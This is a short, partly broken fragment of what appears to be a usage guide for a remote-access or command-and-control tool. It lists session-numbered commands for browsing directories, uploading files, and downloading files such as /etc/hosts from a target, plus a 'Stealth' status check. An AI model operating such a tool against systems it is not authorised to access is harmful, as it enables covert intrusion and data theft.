# 3. Execute commands

```

## File Operations

```bash
ls 1 /home                  # List directory
upload 1 ./file.txt         # Upload (to current dir)
upload 1 ./file.txt /tmp/   # Upload to specific path
download 1 /etc/hosts       # Downloads to downloads/ folder
```

## Stealth

```bash
status 1                    # Check current stealth status

```
